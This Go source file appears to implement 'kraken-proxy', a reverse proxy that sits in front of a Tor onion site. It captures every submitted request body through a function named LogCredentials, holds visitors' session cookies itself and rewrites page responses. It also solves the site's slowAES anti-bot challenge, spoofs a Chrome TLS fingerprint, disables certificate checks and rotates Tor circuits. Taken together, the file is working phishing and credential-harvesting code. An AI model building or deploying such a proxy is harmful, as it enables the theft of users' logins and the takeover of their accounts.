package main

import (
	"bytes"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"

	"kraken-proxy/config"
	"kraken-proxy/logging"
	"kraken-proxy/modification"
	"kraken-proxy/session"
	"kraken-proxy/utils"

	utls "github.com/refraction-networking/utls"
	"golang.org/x/net/http2"
	"golang.org/x/net/proxy"
)

const userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

type TLSDialer struct {
	dialer proxy.Dialer
}

func (td *TLSDialer) Dial(network, addr string) (net.Conn, error) {
	conn, err := td.dialer.Dial(network, addr)
	if err != nil {
		return nil, err
	}

	host, _, _ := net.SplitHostPort(addr)
	config := &utls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
	}
	uconn := utls.UClient(conn, config, utls.HelloChrome_120)

	if err := uconn.Handshake(); err != nil {
		conn.Close()
		return nil, fmt.Errorf("uTLS handshake failed: %w", err)
	}

	return uconn, nil
}

func newTorTransport(socksAddr string) (*http2.Transport, error) {
	socksURL, _ := url.Parse("socks5h://" + socksAddr)
	dialer, err := proxy.FromURL(socksURL, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("SOCKS5h dialer: %w", err)
	}

	tlsDialer := &TLSDialer{dialer: dialer}

	h2Transport := &http2.Transport{
		DialTLS: func(network, addr string, cfg *tls.Config) (net.Conn, error) {
			return tlsDialer.Dial(network, addr)
		},
		AllowHTTP: false,
	}

	return h2Transport, nil
}

func newHTTP1Transport(socksAddr string) (*http.Transport, error) {
	socksURL, _ := url.Parse("socks5h://" + socksAddr)
	dialer, err := proxy.FromURL(socksURL, proxy.Direct)
	if err != nil {
		return nil, fmt.Errorf("SOCKS5h dialer: %w", err)
	}

	tlsDialer := &TLSDialer{dialer: dialer}

	return &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer.Dial(network, addr)
		},
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return tlsDialer.Dial(network, addr)
		},
		MaxIdleConns:      100,
		IdleConnTimeout:   90 * time.Second,
		DisableKeepAlives: false,
	}, nil
}

func computeTCKFromJS(body []byte) (string, error) {
	re := regexp.MustCompile(`toNumbers\("([^"]+)"\)`)
	matches := re.FindAllStringSubmatch(string(body), 3)
	if len(matches) < 3 {
		return "", fmt.Errorf("не найдены параметры AES")
	}
	a, _ := hex.DecodeString(matches[0][1])
	b, _ := hex.DecodeString(matches[1][1])
	c, _ := hex.DecodeString(matches[2][1])

	block, _ := aes.NewCipher(a)
	mode := cipher.NewCBCDecrypter(block, b)
	plain := make([]byte, len(c))
	mode.CryptBlocks(plain, c)
	if pad := int(plain[len(plain)-1]); pad > 0 && pad <= block.BlockSize() {
		plain = plain[:len(plain)-pad]
	}
	return hex.EncodeToString(plain), nil
}

type ProxyHandler struct {
	h1Transport *http.Transport
	h2Transport *http2.Transport
	modifier    *modification.Modifier
	targetURL   string
	proxyHost   string
	cfg         *config.Config
	transports  []struct {
		h1 *http.Transport
		h2 *http2.Transport
	}
	torInstIdx int
	mu         sync.Mutex
}

func (h *ProxyHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	log.Printf("[CLIENT] %s %s", r.Method, r.URL.String())

	h.mu.Lock()
	torIdx := h.torInstIdx % len(h.transports)
	h.torInstIdx++
	h.mu.Unlock()

	torPort := h.cfg.TorPort + torIdx
	log.Printf("[TOR] Используем инстанс %d (порт %d)", torIdx, torPort)

	sid, sess := session.GetOrCreate(r, h.cfg, h.targetURL)

	sidCookie, _ := r.Cookie(h.cfg.SessionName)
	if sidCookie == nil {
		http.SetCookie(w, &http.Cookie{Name: h.cfg.SessionName, Value: sid, Path: "/"})
	}

	targetHost := sess.Host
	targetScheme := sess.Scheme

	onionURL := &url.URL{
		Scheme:   targetScheme,
		Host:     targetHost,
		Path:     r.URL.Path,
		RawQuery: r.URL.RawQuery,
	}

	var reqBodyBytes []byte
	if r.Body != nil {
		reqBodyBytes, _ = io.ReadAll(r.Body)
		r.Body.Close()
	}
	if len(reqBodyBytes) > 0 {
		log.Printf("[REQUEST BODY] %s", string(reqBodyBytes))
		logging.LogCredentials(r.URL.Path, reqBodyBytes)
	}

	req, err := http.NewRequestWithContext(r.Context(), r.Method, onionURL.String(), bytes.NewReader(reqBodyBytes))
	if err != nil {
		http.Error(w, "Bad request", http.StatusBadRequest)
		return
	}

	for key, values := range r.Header {
		keyLower := strings.ToLower(key)
		if keyLower == "cookie" || keyLower == "host" || keyLower == "referer" || keyLower == "origin" {
			continue
		}
		for _, v := range values {
			req.Header.Add(key, v)
		}
	}
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.5")
	if len(reqBodyBytes) > 0 && req.Header.Get("Content-Type") == "" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	req.Host = onionURL.Host

	if ref := r.Header.Get("Referer"); ref != "" {
		if refURL, err := url.Parse(ref); err == nil {
			refURL.Host = onionURL.Host
			refURL.Scheme = onionURL.Scheme
			req.Header.Set("Referer", refURL.String())
		}
	}
	if origin := r.Header.Get("Origin"); origin != "" {
		if originURL, err := url.Parse(origin); err == nil {
			originURL.Host = onionURL.Host
			originURL.Scheme = onionURL.Scheme
			req.Header.Set("Origin", originURL.String())
		}
	}

	for _, c := range sess.GetCookies() {
		req.AddCookie(c)
	}

	if sess.HasTCK() {
		log.Printf("[COOKIES SENT] %d cookies: %v (with TCK)", len(sess.GetCookies()), session.CookieNames(sess.GetCookies()))
	} else {
		log.Printf("[COOKIES SENT] %d cookies: %v", len(sess.GetCookies()), session.CookieNames(sess.GetCookies()))
	}

	// Используем транспорт из пула
	h1t := h.transports[torIdx].h1
	h2t := h.transports[torIdx].h2

	var client *http.Client
	if strings.HasPrefix(onionURL.String(), "https://") {
		client = &http.Client{
			Transport: h2t,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	} else {
		client = &http.Client{
			Transport: h1t,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}
	}

	resp, err := client.Do(req)
	if err != nil && strings.HasPrefix(onionURL.String(), "https://") {
		log.Printf("[FALLBACK HTTP/1.1] %s: %v", onionURL.String(), err)
		client.Transport = h1t
		resp, err = client.Do(req)
		if err != nil {
			log.Printf("[ERR] %s: %v", onionURL.String(), err)
			http.Error(w, "Bad Gateway", http.StatusBadGateway)
			return
		}
	} else if err != nil {
		log.Printf("[ERR] %s: %v", onionURL.String(), err)
		http.Error(w, "Bad Gateway", http.StatusBadGateway)
		return
	}

	defer resp.Body.Close()

	proto := "HTTP/1.1"
	if resp.ProtoMajor == 2 {
		proto = "HTTP/2"
	}
	log.Printf("[PROTO] %s using %s [TOR-%d]", onionURL.String(), proto, torIdx)

	sess.UpdateCookies(resp)

	redirectCount := 0
	maxRedirects := 10
	var bodyStr string

	for {
		bodyBytes, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		bodyStr = string(bodyBytes)

		isMainPage := resp.Request.URL.Path == "/" || resp.Request.URL.Path == ""
		if isMainPage && strings.Contains(bodyStr, "toNumbers") && strings.Contains(bodyStr, "slowAES") {
			tck, err := computeTCKFromJS(bodyBytes)
			if err == nil {
				sess.SetTCK(tck)
				log.Printf("[SESSION] TCK extracted from main page: %s", tck)

				reLoc := regexp.MustCompile(`location\.href\s*=\s*"([^"]+)"`)
				locMatch := reLoc.FindStringSubmatch(bodyStr)
				if locMatch != nil {
					nextURL := resp.Request.URL.String()
					if strings.HasPrefix(locMatch[1], "http") {
						nextURL = locMatch[1]
					} else {
						u, _ := url.Parse(resp.Request.URL.String())
						nextURL = u.ResolveReference(&url.URL{Path: locMatch[1]}).String()
					}

					if !strings.Contains(nextURL, "tck=") {
						if strings.Contains(nextURL, "?") {
							nextURL += "&tck=" + url.QueryEscape(tck)
						} else {
							nextURL += "?tck=" + url.QueryEscape(tck)
						}
					}

					log.Printf("[SESSION] redirecting via location.href with TCK: %s", nextURL)

					newReq, _ := http.NewRequest("GET", nextURL, nil)
					newReq.Header.Set("User-Agent", userAgent)
					newReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
					newReq.Header.Set("Accept-Language", "en-US,en;q=0.5")
					newReq.Host = newReq.URL.Host

					for _, c := range sess.GetCookies() {
						newReq.AddCookie(c)
					}

					client.Transport = h2t
					resp, err = client.Do(newReq)
					if err != nil {
						client.Transport = h1t
						resp, err = client.Do(newReq)
						if err != nil {
							log.Printf("[ERR] TCK transition: %v", err)
							http.Error(w, "Bad Gateway", http.StatusBadGateway)
							return
						}
					}
					sess.UpdateCookies(resp)
					continue
				}
			}
		}

		if resp.StatusCode >= 300 && resp.StatusCode < 400 && !utils.IsStaticAsset(r.URL.Path) && redirectCount < maxRedirects {
			redirectCount++
			loc, locErr := resp.Location()
			if locErr != nil || loc == nil {
				break
			}

			log.Printf("[REDIR %d] %d %s %s -> %s [TOR-%d]", redirectCount, resp.StatusCode, r.Method, resp.Request.URL.String(), loc.String(), torIdx)

			if loc.Scheme != "" && loc.Scheme != "http" {
				log.Printf("[SESSION] scheme updated: %s://%s", loc.Scheme, loc.Host)
				sess.UpdateScheme(loc.Scheme, loc.Host)
			}

			sess.UpdateCookies(resp)

			newReq, err := http.NewRequest("GET", loc.String(), nil)
			if err != nil {
				break
			}

			for key, values := range req.Header {
				keyLower := strings.ToLower(key)
				if keyLower == "cookie" || keyLower == "host" || keyLower == "referer" || keyLower == "origin" || keyLower == "content-length" || keyLower == "content-type" {
					continue
				}
				for _, v := range values {
					newReq.Header.Add(key, v)
				}
			}
			newReq.Header.Set("User-Agent", userAgent)
			newReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
			newReq.Header.Set("Accept-Language", "en-US,en;q=0.5")
			newReq.Host = loc.Host
			newReq.Header.Set("Referer", req.URL.String())

			for _, c := range sess.GetCookies() {
				newReq.AddCookie(c)
			}

			if strings.HasPrefix(loc.String(), "https://") {
				client.Transport = h2t
			} else {
				client.Transport = h1t
			}

			resp, err = client.Do(newReq)
			if err != nil && strings.HasPrefix(loc.String(), "https://") {
				log.Printf("[FALLBACK] redirect failed, trying HTTP/1.1: %v", err)
				client.Transport = h1t
				resp, err = client.Do(newReq)
				if err != nil {
					log.Printf("[ERR] redirect: %v", err)
					http.Error(w, "Bad Gateway", http.StatusBadGateway)
					return
				}
			} else if err != nil {
				log.Printf("[ERR] redirect: %v", err)
				http.Error(w, "Bad Gateway", http.StatusBadGateway)
				return
			}
			continue
		}

		break
	}

	sess.UpdateCookies(resp)

	if resp.Body != nil {
		resp.Body.Close()
	}
	resp.Body = io.NopCloser(strings.NewReader(bodyStr))
	h.modifier.Modify(resp)

	log.Printf("[PROXY RESP] %d, Content-Type: %s, length: %d [TOR-%d]",
		resp.StatusCode, resp.Header.Get("Content-Type"), len(bodyStr), torIdx)

	for k, vals := range resp.Header {
		if k == "Set-Cookie" {
			continue
		}
		for _, v := range vals {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}

func main() {
	cfg := config.Load()

	log.Printf("[TORPOOL] Инициализация %d Tor инстансов на портах %d-%d", 
		cfg.TorInstances, cfg.TorPort, cfg.TorPort+cfg.TorInstances-1)

	// Создаем транспорты для каждого инстанса
	transports := make([]struct {
		h1 *http.Transport
		h2 *http2.Transport
	}, cfg.TorInstances)

	for i := 0; i < cfg.TorInstances; i++ {
		port := cfg.TorPort + i
		addr := fmt.Sprintf("127.0.0.1:%d", port)

		h2t, err := newTorTransport(addr)
		if err != nil {
			log.Printf("[ERR] HTTP/2 Transport на %s: %v", addr, err)
			continue
		}

		h1t, err := newHTTP1Transport(addr)
		if err != nil {
			log.Printf("[ERR] HTTP/1 Transport на %s: %v", addr, err)
			continue
		}

		transports[i].h1 = h1t
		transports[i].h2 = h2t
		log.Printf("[TORPOOL] Инстанс %d ✅ (порт %d)", i, port)
	}

	modifier := modification.New(cfg)

	handler := &ProxyHandler{
		h1Transport: transports[0].h1,
		h2Transport: transports[0].h2,
		modifier:    modifier,
		targetURL:   cfg.InitialTarget,
		proxyHost:   cfg.ProxyHost,
		cfg:         cfg,
		transports:  transports,
		torInstIdx:  0,
	}

	log.Printf("✅ Proxy %s -> onion (uTLS Chrome 120 + HTTP/2 + fallback)", cfg.ProxyHost)
	log.Printf("✅ Tor инстансы: %d (порты %d-%d)", cfg.TorInstances, cfg.TorPort, cfg.TorPort+cfg.TorInstances-1)
	log.Fatal(http.ListenAndServe(":8080", handler))
}
